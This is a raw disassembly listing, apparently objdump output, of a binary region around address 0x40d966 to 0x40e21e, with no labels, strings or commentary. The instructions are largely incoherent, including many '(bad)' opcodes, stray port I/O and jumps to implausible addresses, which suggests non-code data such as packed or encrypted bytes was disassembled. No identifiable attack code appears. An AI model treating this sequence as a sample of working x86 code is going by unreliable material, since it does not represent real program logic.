  40d966:	inc    eax
  40d967:	adc    al,0xba
  40d969:	rol    BYTE PTR [edx],0x75
  40d96c:	cs mov dh,0x36
  40d96f:	hlt    
  40d970:	loope  0x40d9c3
  40d972:	sub    bh,bh
  40d974:	out    dx,al
  40d975:	adc    al,ah
  40d977:	pop    esi
  40d978:	lock pop ebx
  40d97a:	pop    ss
  40d97b:	add    dh,bl
  40d97d:	or     al,0xc8
  40d97f:	add    BYTE PTR gs:[eax],al
	...
  40d992:	add    BYTE PTR [eax],al
  40d994:	js     0x40d92f
  40d996:	jg     0x40d9dc
  40d998:	loope  0x40d9cc
  40d99a:	inc    edi
  40d99b:	call   0xc140ab5a
  40d9a0:	fstp   DWORD PTR [ebx+ebx*8+0x35ef0d1]
  40d9a7:	add    BYTE PTR [ecx],bh
  40d9a9:	mov    ?,WORD PTR [edx+0x79b69182]
  40d9af:	inc    esp
  40d9b0:	cdq    
  40d9b1:	sbb    bl,BYTE PTR [edi]
  40d9b3:	call   0xec87fc12
  40d9b8:	push   edx
  40d9b9:	fcomp  QWORD PTR [ebx-0x256dc48a]
  40d9bf:	sub    ch,BYTE PTR [ebx+0x22]
  40d9c2:	inc    edi
  40d9c3:	in     al,dx
  40d9c4:	and    ah,ah
  40d9c6:	mov    ds:0x8550fc8a,eax
  40d9cb:	rcr    BYTE PTR [edx],0x1a
  40d9ce:	fwait
  40d9cf:	add    esp,DWORD PTR [esi+0x48]
  40d9d2:	add    eax,0x57205955
  40d9d7:	in     al,0xc2
  40d9d9:	pop    esp
  40d9da:	call   0xb205:0x3544fc3a
  40d9e1:	pop    esp
  40d9e2:	mov    ds:0x47223aea,al
  40d9e7:	in     al,0x2e
  40d9e9:	add    BYTE PTR [edi+edx*1+0x540d3526],bl
  40d9f0:	push   ds
  40d9f1:	xor    eax,0xb6d99be1
  40d9f6:	or     eax,0xb1
	...
  40da0b:	add    BYTE PTR [ebx-0x40],al
  40da0e:	jnp    0x40da10
  40da10:	push   es
  40da11:	xor    eax,0x251c9bf5
  40da16:	div    BYTE PTR [eax-0x45723fdd]
  40da1c:	clc    
  40da1d:	adc    ebp,ecx
  40da1f:	jp     0x40da9e
  40da21:	int3   
  40da22:	jno    0x40d9f7
  40da24:	lods   eax,DWORD PTR ds:[esi]
  40da25:	inc    esp
  40da26:	mov    ebp,0xb144c453
  40da2b:	push   ebx
  40da2c:	imul   ebx,DWORD PTR [eax-0x5138539e],0x6f
  40da33:	inc    esi
  40da34:	jmp    0x9f1115e7
  40da39:	and    eax,0x82afb10d
  40da3e:	and    edx,esp
  40da40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da41:	xor    bh,ah
  40da43:	test   BYTE PTR ds:0x2e37e8c8,bl
  40da49:	scas   eax,DWORD PTR es:[edi]
  40da4a:	adc    ebx,eax
  40da4c:	(bad)  
  40da4d:	xor    al,0xa1
  40da4f:	mov    al,0xd
  40da51:	cld    
  40da52:	jge    0x40da8a
  40da54:	xor    DWORD PTR [edi+0x34760c1b],ebp
  40da5a:	xchg   ecx,eax
  40da5b:	fwait
  40da5c:	cmp    BYTE PTR [ebx-0x15004f9b],ch
  40da62:	fld    TBYTE PTR [ebx-0x4ec67dd1]
  40da68:	push   edi
  40da69:	scas   al,BYTE PTR es:[edi]
  40da6a:	dec    ebp
  40da6b:	ss inc ebp
  40da6d:	xchg   edi,eax
  40da6e:	sub    al,0x27
	...
  40da84:	inc    esi
  40da85:	scas   al,BYTE PTR es:[edi]
  40da86:	add    BYTE PTR [edx],0x39
  40da89:	add    BYTE PTR [eax],al
  40da8b:	jmp    0xd6029219
  40da90:	cmp    dl,BYTE PTR [ebx-0x75]
  40da93:	adc    eax,0xf174ad81
  40da98:	ret    0x71b1
  40da9b:	push   ss
  40da9c:	leave  
  40da9d:	and    eax,0x7ba507
  40daa2:	(bad)  
  40daa3:	jl     0x40daa7
  40daa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa6:	cmp    al,0xb6
  40daa8:	cmp    al,BYTE PTR [eax]
  40daaa:	or     ebp,DWORD PTR [ecx]
  40daac:	das    
  40daad:	add    ebx,DWORD PTR [edi+0x20]
  40dab0:	hlt    
  40dab1:	add    eax,0x3daf00
  40dab6:	call   DWORD PTR [ebp+ebx*8-0x5b]
  40daba:	rcr    BYTE PTR [ebx-0x5a],cl
  40dabd:	scas   al,BYTE PTR es:[edi]
  40dabe:	mov    esi,0x3f76e0
  40dac3:	mov    BYTE PTR [eax],0xf8
  40dac6:	push   esi
  40dac7:	shl    DWORD PTR [esi+esi*8],1
  40daca:	(bad)  
  40dacb:	call   0xe4b54883
  40dad0:	push   DWORD PTR [esi-0x53c50e3f]
  40dad6:	xor    ch,BYTE PTR [ecx-0x690151f4]
  40dadc:	out    0xaf,al
  40dade:	lods   eax,DWORD PTR ds:[esi]
  40dadf:	shl    DWORD PTR [edi],1
  40dae1:	xor    esp,eax
  40dae3:	xchg   BYTE PTR [eax-0x8],al
  40dae6:	out    0x5,eax
	...
  40dafc:	sub    BYTE PTR [ebp+0x347ae2fe],0x5
  40db03:	push   cs
  40db04:	lods   al,BYTE PTR ds:[esi]
  40db05:	mov    edi,0xe742e907
  40db0a:	inc    ebx
  40db0b:	test   al,0x3a
  40db0d:	lods   eax,DWORD PTR ds:[esi]
  40db0e:	je     0x40daf1
  40db10:	mov    dl,0xb9
  40db12:	xor    al,0xe9
  40db14:	cmp    bh,cl
  40db16:	mov    edi,0xfdac8500
  40db1b:	jne    0x40db69
  40db1d:	cs add al,0xcc
  40db20:	push   es
  40db21:	inc    esp
  40db22:	add    BYTE PTR [eax-0x2c],ch
  40db25:	inc    esp
  40db26:	inc    ecx
  40db27:	add    BYTE PTR [edi-0x19],bl
  40db2a:	pop    es
  40db2b:	call   0x3f82b2
  40db30:	sbb    eax,ecx
  40db32:	jae    0x40db3d
  40db34:	aas    
  40db35:	out    0xb,eax
  40db37:	(bad)  
  40db38:	adc    eax,0x104164d1
  40db3d:	or     DWORD PTR [ebx+0x44],edx
  40db40:	mov    eax,ds:0xd875ff00
  40db45:	mov    BYTE PTR [esi+0xb00d035],dl
  40db4b:	rol    BYTE PTR [ebp-0x238a0255],0x2d
  40db52:	add    al,0xd4
  40db54:	jbe    0x40db99
  40db56:	add    BYTE PTR [eax+0xd1],bh
  40db5c:	pop    ds
  40db5d:	imul   eax,eax,0x8
	...
  40db74:	mov    al,ds:0x23ec8b47
  40db79:	vorps  xmm4,xmm1,XMMWORD PTR [edi+0xc]
  40db7e:	add    eax,DWORD PTR [ecx+edx*2+0x4]
  40db82:	push   DWORD PTR [ebp-0x68]
  40db85:	mov    BYTE PTR [esi+esi*1-0x3ff4ff60],al
  40db8c:	test   DWORD PTR [edx],eax
  40db8e:	pop    edi
  40db8f:	pop    esi
  40db90:	leave  
  40db91:	mov    esi,0x29200002
  40db96:	out    dx,eax
  40db97:	mov    ebx,DWORD PTR [ebp-0x58]
  40db9a:	jmp    0x3cc18fa0
  40db9f:	add    BYTE PTR [ebp+0x3968a256],al
  40dba5:	pushf  
  40dba6:	inc    esi
  40dba7:	inc    ecx
  40dba8:	cmp    DWORD PTR [esi],edi
  40dbaa:	cmp    BYTE PTR [eax],cl
  40dbac:	push   ecx
  40dbad:	mov    dh,0xf4
  40dbaf:	(bad)  
  40dbb0:	ds mov cl,0xc2
  40dbb3:	je     0x40dbf4
  40dbb5:	xchg   edx,eax
  40dbb6:	dec    esp
  40dbb7:	leave  
  40dbb8:	sti    
  40dbb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbba:	add    cl,BYTE PTR [ebx+0x2199b1a4]
  40dbc0:	mov    ecx,0x3073fbca
  40dbc5:	sbb    esi,ebp
  40dbc7:	or     al,0x85
  40dbc9:	mov    ch,0x82
  40dbcb:	xor    ebp,DWORD PTR ds:0x5e3e7ffe
  40dbd2:	or     bh,BYTE PTR ss:[ecx+0x744f72]
	...
  40dbe9:	add    BYTE PTR [eax],al
  40dbeb:	add    BYTE PTR [ecx+ebx*1],dh
  40dbee:	out    dx,al
  40dbef:	pop    edi
  40dbf0:	ins    BYTE PTR es:[edi],dx
  40dbf1:	xchg   esi,eax
  40dbf2:	les    eax,FWORD PTR [esi]
  40dbf4:	sbb    edx,esp
  40dbf6:	cmp    DWORD PTR [esi],0x39
  40dbf9:	dec    esp
  40dbfa:	retf   
  40dbfb:	(bad)  
  40dbfc:	je     0x40dbbb
  40dbfe:	add    eax,DWORD PTR [eax]
  40dc00:	cmp    DWORD PTR [ecx-0x663ebb3d],ebx
  40dc06:	add    al,BYTE PTR [eax]
  40dc08:	cmp    DWORD PTR [esi],ebx
  40dc0a:	das    
  40dc0b:	or     BYTE PTR [edx+0x5e3e83de],ah
  40dc11:	or     al,0xd9
  40dc13:	sbb    BYTE PTR [ecx*4-0x75d48afd],0x46
  40dc1b:	clc    
  40dc1c:	cmp    BYTE PTR [ecx-0x5af3fffe],bl
  40dc22:	ret    
  40dc23:	inc    esp
  40dc24:	jge    0x40dbbe
  40dc26:	add    al,BYTE PTR [eax]
  40dc28:	cmp    DWORD PTR [esi+0x10],edi
  40dc2b:	div    esp
  40dc2d:	xor    BYTE PTR [ebx],al
  40dc2f:	add    BYTE PTR [ecx],bh
  40dc31:	add    cl,ch
  40dc33:	ss xor eax,edx
  40dc36:	in     eax,0xe3
  40dc38:	jg     0x40dc7f
  40dc3a:	push   ebp
  40dc3b:	add    al,0x39
  40dc3d:	add    cl,ch
  40dc3f:	add    DWORD PTR [edi],0x4c
  40dc42:	mov    esp,0x41453e06
  40dc47:	cdq    
  40dc48:	aas    
  40dc49:	ret    
  40dc4a:	stos   DWORD PTR es:[edi],eax
  40dc4b:	stos   DWORD PTR es:[edi],eax
  40dc4c:	cs stos DWORD PTR es:[edi],eax
  40dc4e:	call   0x40dc56
	...
  40dc63:	add    BYTE PTR [edx-0x5bfcdad4],bh
  40dc69:	jmp    DWORD PTR [esi]
  40dc6b:	add    eax,0xed694359
  40dc70:	push   cs
  40dc71:	xor    al,0x59
  40dc73:	jns    0x40dbfa
  40dc75:	clc    
  40dc76:	adc    DWORD PTR [eax],edx
  40dc78:	mov    ecx,0x4f36c8ea
  40dc7d:	xor    BYTE PTR [ebp+0x2],0x19
  40dc81:	xor    eax,0x1d254d9
  40dc86:	jae    0x40dccc
  40dc88:	cmp    BYTE PTR [eax-0x1b],bh
  40dc8b:	inc    esp
  40dc8c:	mov    ecx,0xc436e8ea
  40dc91:	dec    edx
  40dc92:	push   ds
  40dc93:	inc    ebp
  40dc94:	mov    ecx,0xde36e8ea
  40dc99:	ret    0xb823
  40dc9c:	mov    dh,0xaa
  40dc9e:	call   0xe1759ea6
  40dca3:	js     0x40dcca
  40dca5:	clc    
  40dca6:	xchg   ecx,eax
  40dca7:	loope  0x40dcc7
  40dca9:	jmp    0x40dc77
  40dcab:	ss xor eax,0x8e03edc2
  40dcb1:	xor    al,0x95
  40dcb3:	push   ebp
  40dcb4:	xchg   ecx,eax
  40dcb5:	(bad)  
  40dcb6:	xchg   BYTE PTR [edi+edi*2+0x3f36a8f6],ch
  40dcbd:	dec    ebx
  40dcbe:	add    BYTE PTR [edi],dl
  40dcc0:	mov    dl,0xc0
  40dcc2:	add    ebp,ecx
  40dcc4:	loope  0x40dc77
  40dcc6:	inc    ebp
  40dcc7:	data16 add BYTE PTR [eax],al
	...
  40dcda:	add    BYTE PTR [eax],al
  40dcdc:	div    DWORD PTR [ebx-0x559a96ba]
  40dce2:	jae    0x40dd14
  40dce4:	popf   
  40dce5:	xor    esi,esp
  40dce7:	mov    bh,0xa2
  40dce9:	idiv   ch
  40dceb:	inc    esi
  40dcec:	lea    ecx,[ecx+0x5e]
  40dcef:	xor    al,bh
  40dcf1:	std    
  40dcf2:	call   FWORD PTR [ebx+0x258295b1]
  40dcf8:	loop   0x40dd4d
  40dcfa:	push   edi
  40dcfb:	push   0x4f
  40dcfd:	adc    al,0x0
  40dcff:	xchg   ebp,eax
  40dd00:	adc    edi,DWORD PTR [edi+0x3c]
  40dd03:	mov    esi,0xe90040f3
  40dd08:	dec    edi
  40dd09:	add    bl,BYTE PTR [edi-0x59]
  40dd0c:	ret    
  40dd0d:	mov    edi,0x4471e90f
  40dd12:	adc    al,0xb0
  40dd14:	aaa    
  40dd15:	mov    esp,0xf93aa865
  40dd1a:	or     BYTE PTR [edx+0x20000034],0x38
  40dd21:	shl    BYTE PTR [ebp+0x28],1
  40dd24:	xor    eax,0x3c7682f9
  40dd29:	add    BYTE PTR [eax],al
  40dd2b:	add    BYTE PTR [eax],bh
  40dd2d:	aam    0x65
  40dd2f:	sub    BYTE PTR ds:0x346282f9,bh
  40dd35:	add    BYTE PTR [eax],al
  40dd37:	pop    esp
  40dd38:	clc    
  40dd39:	mov    bl,0x4f
  40dd3b:	je     0x40dd35
  40dd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3e:	dec    edi
  40dd3f:	ins    BYTE PTR es:[edi],dx
	...
  40dd54:	clc    
  40dd55:	stos   DWORD PTR es:[edi],eax
  40dd56:	dec    edi
  40dd57:	xchg   esi,eax
  40dd58:	mov    BYTE PTR [ebp-0x56c2d79b],dh
  40dd5e:	je     0x40dd60
  40dd60:	pusha  
  40dd61:	test   DWORD PTR [eax+edi*8+0x458b54f7],edi
  40dd68:	mov    eax,0xe4458d54
  40dd6d:	push   ebx
  40dd6e:	lea    eax,[ebp+0x0]
  40dd71:	push   esp
  40dd72:	push   DWORD PTR ds:0x40de0c
  40dd78:	out    0xee,eax
  40dd7a:	psubsb mm7,QWORD PTR [esp+ebx*2+0x3ec5fffd]
  40dd82:	fcom   QWORD PTR [eax-0x5b]
  40dd85:	aas    
  40dd86:	loopne 0x40ddd8
  40dd88:	xchg   ebp,eax
  40dd89:	aas    
  40dd8a:	in     al,0x50
  40dd8c:	push   edi
  40dd8d:	scas   eax,DWORD PTR es:[edi]
  40dd8e:	into   
  40dd8f:	sar    sp,1
  40dd92:	(bad)  
  40dd93:	jne    0x40dda5
  40dd95:	test   DWORD PTR [eax-0x2aad808],ecx
  40dd9b:	jne    0x40ddd9
  40dd9d:	and    eax,0xef37d444
  40dda2:	fisttp DWORD PTR [edi+0x45c5b49d]
  40dda8:	push   eax
  40dda9:	add    al,0x0
  40ddab:	add    al,dl
  40ddad:	daa    
  40ddae:	inc    esp
  40ddaf:	int3   
  40ddb0:	and    BYTE PTR [edx],cl
  40ddb2:	add    DWORD PTR [edx-0x20],ebp
  40ddb5:	or     al,BYTE PTR [eax]
  40ddb7:	push   0x0
	...
  40ddc9:	add    BYTE PTR [eax],al
  40ddcb:	add    al,ah
  40ddcd:	or     al,BYTE PTR [eax]
  40ddcf:	lea    ebx,ds:0xddff4ed0
  40ddd5:	dec    ebp
  40ddd6:	sub    DWORD PTR [ecx-0x60],eax
  40ddd9:	test   eax,0xab1c0fbe
  40ddde:	(bad)  
  40dddf:	call   DWORD PTR [eax-0x6f2f847f]
  40dde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde6:	add    BYTE PTR [eax],0xa1
  40dde9:	cld    
  40ddea:	dec    DWORD PTR [edx+0x3ab7e439]
  40ddf0:	hlt    
  40ddf1:	cmp    cl,0x86
  40ddf4:	test   DWORD PTR [esi+0x2d750002],edx
  40ddfa:	xor    al,dl
  40ddfc:	ret    0xc6b3
  40ddff:	mov    dh,ah
  40de01:	mov    ah,BYTE PTR [ebp-0x568595ff]
  40de07:	je     0x40dd8e
  40de09:	sbb    DWORD PTR [eax-0x1c],eax
  40de0c:	dec    esi
  40de0d:	retf   
  40de0e:	shl    bh,cl
  40de10:	data16 add al,0x4
  40de13:	add    BYTE PTR [edx+0x47ffa6c3],bh
  40de19:	sbb    eax,0x9a2effb9
  40de1e:	test   DWORD PTR [ecx+ebp*1-0x66],edi
  40de22:	stc    
  40de23:	xor    ebp,0xffffff99
  40de26:	add    al,BYTE PTR [eax]
  40de28:	mov    edx,0x3fff9e84
  40de2d:	adc    eax,0xff6d
	...
  40de42:	add    BYTE PTR [eax],al
  40de44:	push   es
  40de45:	call   0x606d:0x11fd74a9
  40de4c:	mul    BYTE PTR [esi-0x50febb86]
  40de52:	cs cld 
  40de54:	out    0x2c,al
  40de56:	mov    ebx,0x9bc564fe
  40de5b:	fistp  WORD PTR [eax-0x3a]
  40de5e:	test   al,0x67
  40de60:	pop    ebx
  40de61:	aad    0x42
  40de63:	add    cl,dl
  40de65:	inc    ebp
  40de66:	idiv   bh
  40de68:	mov    esi,0xfd621c09
  40de6d:	xlat   BYTE PTR ds:[ebx]
  40de6e:	add    edi,edi
  40de70:	and    al,0x61
  40de72:	fwait
  40de73:	sub    eax,0xb02996d
  40de78:	jns    0x40de7a
  40de7a:	sbb    eax,0x2519210c
  40de7f:	inc    ebx
  40de80:	cmp    DWORD PTR [eax-0x587909e8],ebx
  40de86:	cmp    BYTE PTR [eax+edx*1],bl
  40de89:	cmp    al,0x28
  40de8b:	add    al,0x76
  40de8d:	sub    eax,0xec489cb1
  40de92:	call   0xf501109a
  40de97:	or     edx,ecx
  40de99:	xor    BYTE PTR [ebp-0x4b67c6be],ch
  40de9f:	cmc    
  40dea0:	dec    esi
  40dea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dea2:	mov    eax,0xa83bc81b
  40dea7:	add    eax,DWORD PTR [eax]
	...
  40deb9:	add    BYTE PTR [eax],al
  40debb:	add    BYTE PTR [esi],bh
  40debd:	sub    eax,0xf32c9c31
  40dec2:	call   0xbc0120ca
  40dec7:	ds xchg ecx,eax
  40dec9:	add    cl,ch
  40decb:	cwde   
  40decc:	fsub   QWORD PTR [esi+0x6a1ef79b]
  40ded2:	mov    ebx,0xdba70fa8
  40ded7:	mov    ebx,0xa8e9419c
  40dedc:	test   esp,esi
  40dede:	adc    BYTE PTR [eax-0x6b],bl
  40dee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dee2:	std    
  40dee3:	test   al,0x65
  40dee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dee6:	cmc    
  40dee7:	cs in  eax,dx
  40dee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deea:	jae    0x40dee3
  40deec:	(bad)  
  40deed:	retf   
  40deee:	inc    ebx
  40deef:	test   eax,0xb453a6d7
  40def4:	iret   
  40def5:	sub    al,0xc1
  40def7:	test   al,0x4d
  40def9:	hlt    
  40defa:	rol    cl,0x5d
  40defd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40defe:	lds    ebp,FWORD PTR [eax+0x2ebd9c2d]
  40df04:	lea    esp,[esi-0x615ec401]
  40df0a:	mov    bh,0xc
  40df0c:	shl    BYTE PTR [ebp-0x612ae302],1
  40df12:	lock or eax,esp
  40df15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df16:	pop    esi
  40df17:	aaa    
  40df18:	ret    0xfc0
  40df1b:	jmp    0x6b2c5a0f
	...
  40df34:	mov    dh,0x9e
  40df36:	cmp    ah,0x3e
  40df39:	std    
  40df3a:	push   cs
  40df3b:	ins    BYTE PTR es:[edi],dx
  40df3c:	dec    ebp
  40df3d:	add    DWORD PTR [eax],eax
  40df3f:	jmp    0xba351b2b
  40df44:	iret   
  40df45:	cmp    edi,eax
  40df47:	mov    ecx,0xb9fc3bc7
  40df4c:	and    al,0x2
  40df4e:	call   esp
  40df50:	sub    bl,BYTE PTR [eax-0x591ec1e0]
  40df56:	cmp    BYTE PTR [edx+eiz*8-0x1293f100],0xa5
  40df5e:	(bad)  
  40df5f:	jmp    0x77350c35
  40df64:	push   edi
  40df65:	mov    al,0x67
  40df67:	fisttp DWORD PTR [esi+0x3f]
  40df6a:	add    BYTE PTR [esi],dl
  40df6c:	push   edi
  40df6d:	mov    al,0xe7
  40df6f:	ret    
  40df70:	add    al,0xa6
  40df72:	(bad)  
  40df73:	repnz cli 
  40df75:	test   BYTE PTR [ecx+eiz*1+0x6400003a],0x27
  40df7d:	lods   al,BYTE PTR ds:[esi]
  40df7e:	dec    edi
  40df7f:	pop    esp
  40df80:	pop    ds
  40df81:	test   al,0x4f
  40df83:	je     0x40dffd
  40df85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df86:	dec    edi
  40df87:	push   ebx
  40df88:	xor    eax,0xa2f974a5
  40df8d:	fwait
  40df8e:	cmc    
  40df8f:	into   
  40df90:	xchg   esi,eax
  40df91:	cmp    BYTE PTR [eax+eax*1+0x78],0xfb
  40df96:	push   cs
  40df97:	test   DWORD PTR [eax],eax
	...
  40dfa9:	add    BYTE PTR [eax],al
  40dfab:	add    BYTE PTR [eax-0x10000004],bh
  40dfb1:	out    dx,eax
  40dfb2:	repz push 0x4141cd
  40dfb8:	test   al,0xab
  40dfba:	xor    BYTE PTR [eax],al
  40dfbc:	mov    al,ds:0x150fbeaa
  40dfc1:	and    edi,edi
  40dfc3:	call   DWORD PTR [eax+0x50f44428]
  40dfc9:	daa    
  40dfca:	inc    esp
  40dfcb:	clc    
  40dfcc:	push   eax
  40dfcd:	daa    
  40dfce:	inc    esp
  40dfcf:	cld    
  40dfd0:	inc    eax
  40dfd1:	or     al,BYTE PTR [ebx]
  40dfd3:	jmp    DWORD PTR [ebp+0x11]
  40dfd6:	call   0xfd9dd68c
  40dfdb:	sub    DWORD PTR [ebp+0x59],0xfffffffe
  40dfdf:	push   cs
  40dfe0:	aad    0x80
  40dfe2:	(bad)  
  40dfe3:	call   DWORD PTR [eax+0x2a]
  40dfe6:	inc    esp
  40dfe7:	hlt    
  40dfe8:	jg     0x40df96
  40dfea:	lea    eax,[ebp+0x7c]
  40dfed:	daa    
  40dfee:	inc    esp
  40dfef:	hlt    
  40dff0:	shl    BYTE PTR [edi],0x44
  40dff3:	clc    
  40dff4:	shl    BYTE PTR [edi],0x44
  40dff7:	cld    
  40dff8:	rol    BYTE PTR [esi],1
  40dffa:	add    al,0xff
  40dffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dffd:	adc    al,ch
  40dfff:	mov    DWORD PTR [esi],esp
  40e001:	pop    ebp
  40e002:	std    
  40e003:	sub    DWORD PTR [ebp-0x608b00a8],0x65
  40e00a:	add    ecx,esp
  40e00c:	mov    dh,0x3b
  40e00e:	add    bh,bh
	...
  40e024:	out    dx,eax
  40e025:	pop    ebp
  40e026:	std    
  40e027:	(bad)  
  40e028:	aad    0xd0
  40e02a:	fs inc ecx
  40e02c:	loopne 0x40e08b
  40e02e:	std    
  40e02f:	(bad)  
  40e030:	out    dx,eax
  40e031:	gs add edx,esp
  40e034:	cmp    DWORD PTR ds:0xb5be0045,esi
  40e03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e03b:	(bad)  
  40e03c:	mov    dh,0xe3
  40e03e:	scas   eax,DWORD PTR es:[edi]
  40e03f:	out    0x3b,eax
  40e041:	arpl   WORD PTR [ebp-0x642c8102],sp
  40e047:	add    BYTE PTR [ecx],bh
  40e049:	xchg   edi,eax
  40e04a:	add    al,BYTE PTR [ebx+0x411c6b54]
  40e050:	cmp    DWORD PTR [esi-0x3445d6d2],eax
  40e056:	shl    BYTE PTR [ebp-0x8],cl
  40e059:	xchg   esi,eax
  40e05a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e05b:	jae    0x40e076
  40e05d:	sbb    ch,al
  40e05f:	rcl    edi,cl
  40e061:	xlat   BYTE PTR ds:[ebx]
  40e062:	add    edi,edi
  40e064:	in     eax,dx
  40e065:	lds    ebx,FWORD PTR [edx]
  40e067:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e069:	(bad)  
  40e06a:	add    ecx,DWORD PTR [ebp-0xacb104]
  40e070:	les    esi,FWORD PTR [edx]
  40e072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e073:	je     0x40e0aa
  40e075:	dec    esi
  40e076:	xor    BYTE PTR [eax],cl
  40e078:	push   ecx
  40e079:	sahf   
  40e07a:	stos   BYTE PTR es:[edi],al
  40e07b:	(bad)  
  40e07c:	ss icebp 
  40e07e:	ror    BYTE PTR [edi],0x39
  40e081:	mov    WORD PTR [ecx-0x15],?
  40e084:	mov    edx,0xfe96d5
	...
  40e099:	add    BYTE PTR [eax],al
  40e09b:	add    BYTE PTR [ecx+eiz*4-0x258f6366],ah
  40e0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a3:	imul   ebp,DWORD PTR [ecx],0x69f04014
  40e0a9:	or     dh,BYTE PTR [eax]
  40e0ab:	or     BYTE PTR [ecx],dl
  40e0ad:	stos   DWORD PTR es:[edi],eax
  40e0ae:	dec    edx
  40e0af:	push   esi
  40e0b1:	scas   al,BYTE PTR es:[edi]
  40e0b2:	ret    0x3574
  40e0b5:	lock rol BYTE PTR [edi],0x39
  40e0b9:	jg     0x40e0cd
  40e0bb:	push   0x4356cc
  40e0c0:	les    eax,FWORD PTR [eax]
  40e0c2:	sub    al,0xb4
  40e0c4:	jle    0x40e05e
  40e0c6:	aad    0x45
  40e0c8:	(bad)  
  40e0c9:	mov    ds:0xfc45c3e1,eax
  40e0ce:	lahf   
  40e0cf:	ret    0x3e
  40e0d2:	scas   al,BYTE PTR es:[edi]
  40e0d3:	aas    
  40e0d4:	popf   
  40e0d5:	add    ecx,ebp
  40e0d7:	add    edi,DWORD PTR [ecx]
  40e0d9:	jne    0x40e106
  40e0db:	cwde   
  40e0dc:	out    dx,al
  40e0dd:	mov    ds:0xdd9efc33,al
  40e0e2:	inc    edx
  40e0e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e4:	(bad)  
  40e0e5:	imul   DWORD PTR [eax+0x137f3f30]
  40e0eb:	cwde   
  40e0ec:	jle    0x40e11a
  40e0ee:	out    0xd8,eax
  40e0f0:	mov    dh,0xb9
  40e0f2:	stos   BYTE PTR es:[edi],al
  40e0f3:	cld    
  40e0f4:	outs   dx,BYTE PTR ds:[esi]
  40e0f5:	xor    edx,edx
  40e0f7:	mov    edx,0x9c97fd53
  40e0fc:	jmp    0x40e0fe
  40e0fe:	sub    cl,bh
	...
  40e114:	xchg   esi,eax
  40e115:	sub    eax,0xa8ba4c5e
  40e11a:	out    0x2e,eax
  40e11c:	cmp    al,0x68
  40e11e:	call   0x6a411926
  40e123:	stos   DWORD PTR es:[edi],eax
  40e124:	cmp    DWORD PTR [edi+ebp*8],ebp
  40e127:	fsubr  st,st(6)
  40e129:	mov    eax,0x5e26fc2a
  40e12e:	sub    al,0x1e
  40e130:	js     0x40e132
  40e132:	pop    esp
  40e133:	aas    
  40e134:	and    eax,0x412f2650
  40e139:	cwde   
  40e13a:	jmp    0x40e185
  40e13c:	push   es
  40e13d:	mov    ds:0x2c39ac69,eax
  40e142:	in     al,0x80
  40e144:	out    dx,al
  40e145:	std    
  40e146:	jnp    0x40e145
  40e148:	mov    ebx,0x6c040d24
  40e14d:	cli    
  40e14e:	inc    ecx
  40e150:	cli    
  40e151:	mov    bh,0xc1
  40e153:	loope  0x40e18f
  40e155:	jne    0x40e19b
  40e157:	aad    0x6a
  40e159:	mov    ds:0x95a2f174,eax
  40e15e:	pop    eax
  40e15f:	(bad)  
  40e160:	xchg   ebp,eax
  40e161:	jge    0x40e15a
  40e163:	call   0xc1c3dece
  40e168:	cmp    BYTE PTR ds:0x945f6a06,ch
  40e16e:	(bad)  
  40e16f:	cmp    ebx,DWORD PTR [edi+0x78a0bfd5]
  40e175:	cli    
  40e176:	push   DWORD PTR [ebx+0x0]
	...
  40e189:	add    BYTE PTR [eax],al
  40e18b:	add    BYTE PTR [edi-0x6c],cl
  40e18e:	dec    edi
  40e18f:	sahf   
  40e190:	push   edi
  40e191:	clc    
  40e192:	out    0xa0,eax
  40e194:	repz mov ds:0x2b7ae2fe,al
  40e19a:	push   es
  40e19b:	push   0x17
  40e19d:	xchg   esp,eax
  40e19e:	push   ebx
  40e1a0:	fs aad 0xbf
  40e1a3:	mov    al,ds:0x5bfffa78
  40e1a8:	pop    ss
  40e1a9:	xchg   esp,eax
  40e1aa:	dec    edi
  40e1ab:	popw   ds
  40e1ad:	clc    
  40e1ae:	out    0x8c,eax
  40e1b0:	repz mov ds:0xe2926afe,al
  40e1b6:	je     0x40e19f
  40e1b8:	mov    ecx,0x5fe9ec24
  40e1bd:	cli    
  40e1be:	sub    ch,BYTE PTR [ecx]
  40e1c0:	jecxz  0x40e181
  40e1c2:	pop    es
  40e1c3:	jmp    0x9a2d1e6f
  40e1c8:	(bad)  [eax+ecx*1]
  40e1cb:	adc    DWORD PTR [edx-0x46e100b8],ebp
  40e1d1:	test   eax,0x7efc9c1f
  40e1d6:	jl     0x40e1d5
  40e1d8:	cmp    ebp,DWORD PTR [ebx]
  40e1da:	push   es
  40e1db:	add    BYTE PTR [ebx],cl
  40e1dd:	mov    esi,0xfde8c2c7
  40e1e2:	mov    WORD PTR [ebp+0x34],es
  40e1e5:	dec    ebp
  40e1e6:	push   DWORD PTR [ebp-0x28]
  40e1e9:	test   DWORD PTR [ecx+0x59],esi
  40e1ec:	xlat   BYTE PTR ds:[ebx]
  40e1ed:	pop    ebp
  40e1ee:	cmp    eax,0x0
	...
  40e204:	xor    BYTE PTR [edi],al
  40e206:	push   es
  40e207:	and    DWORD PTR [ebp+0x70],0xfffffffe
  40e20b:	je     0x40e1ab
  40e20d:	xchg   edx,eax
  40e20e:	mov    esi,0xfff4e2c9
  40e213:	mov    WORD PTR [ebp+0x70],ds
  40e216:	dec    esi
  40e217:	push   0x30
  40e219:	pop    ebp
  40e21a:	jae    0x40e224
  40e21c:	js     0x40e1fb
  40e21e:	pop    eax
